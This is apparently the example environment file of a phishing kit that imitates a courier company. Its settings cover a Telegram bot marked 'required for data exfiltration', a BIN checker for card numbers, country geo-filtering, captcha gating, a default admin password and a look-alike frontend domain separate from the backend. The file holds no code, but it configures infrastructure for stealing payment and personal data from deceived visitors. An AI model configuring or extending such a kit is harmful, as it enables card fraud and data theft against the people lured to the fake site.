# Copy to .env and fill in your values. Do not commit .env.
# cp env.example .env

# Server
NODE_ENV=production
PORT=3000

# Session (required in production — generate: openssl rand -base64 32)
SESSION_SECRET=change-me-in-production

# Telegram (required for data exfiltration)
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=

# Admin panel password (default: music2018)
ADMIN_PASSWORD=

# hCaptcha (optional)
HCAPTCHA_SITE_KEY=
HCAPTCHA_SECRET_KEY=

# BIN checker API (optional)
BINCODES_API_KEY=

# Allowed countries, comma-separated (optional; leave empty for no geo filter)
ALLOWED_COUNTRIES=

# API origin for the client (optional). Set at BUILD time if the frontend is served from a different domain than the backend (e.g. static site at thcourierguy.cpem.info, backend on Render). Example: VITE_API_ORIGIN=https://courier-guuy-xxxx.onrender.com
# VITE_API_ORIGIN=
